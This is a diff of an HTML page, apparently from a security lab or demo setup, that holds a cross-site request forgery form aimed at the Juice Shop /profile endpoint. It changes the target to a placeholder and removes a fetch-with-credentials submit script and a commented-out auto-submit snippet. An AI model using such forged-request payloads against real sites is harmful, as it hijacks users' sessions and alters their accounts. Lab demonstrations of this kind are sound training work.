@@ -82,36 +82,10 @@ data:
     <h3>Hacking Form</h3>
     Submit form to hack "username" in Juiceshop
     <form id="hackingform" 
-          action="https://juiceshop-via-waap-10-99-0-10.nip.io:8443/profile" 
+          action="https://{{TRAFFIC_HOST1_9090}}/profile" 
          method="POST">
      Username:<input name="username" type="text" value="hacked" />
      <input type="submit" value="Hack Username" />
     </form>
-    <script type='text/javascript'>
-    
-    document.forms['hackingform'].addEventListener('submit', (event) => {
-        event.preventDefault();
-        // TODO do something here to show user that form is being submitted
-        fetch(event.target.action, {
-            method: 'POST',
-            credentials: 'include',
-            body: new URLSearchParams(new FormData(event.target)) // event.target is the form
-        }).then((response) => {
-            if (!response.ok) {
-              throw new Error(`HTTP error! Status: ${response.status}`);
-            }
-            return response.json(); // or response.text() or whatever the server sends
-        }).then((body) => {
-            // TODO handle body
-        }).catch((error) => {
-            // TODO handle error
-        });
-    });
     </script>
-    
-    <!-- Uncomment lines below and remove "xxx" prefix to activate auto-submit on load 
-    <xxxscript>
-     document.getElementById("autosubmit").submit();
-    </xxxscript>
-    -->
     </body></html>
